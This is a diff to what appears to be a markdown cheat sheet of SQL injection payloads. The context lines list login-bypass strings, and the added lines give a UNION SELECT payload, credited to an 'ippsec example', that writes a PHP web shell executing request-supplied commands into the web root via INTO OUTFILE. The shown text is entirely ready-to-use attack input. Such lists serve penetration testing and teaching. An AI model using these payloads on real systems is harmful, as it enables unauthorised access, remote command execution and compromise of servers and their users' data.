@@ -308,6 +308,9 @@ admin") or "1"="1"--
 admin") or "1"="1"#
 admin") or "1"="1"/*
 'ad'||'min'
+
+ippsec example (Writing files to disk)
+X' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/x.php'-- -
 ```
 
 ### Bruteforcing
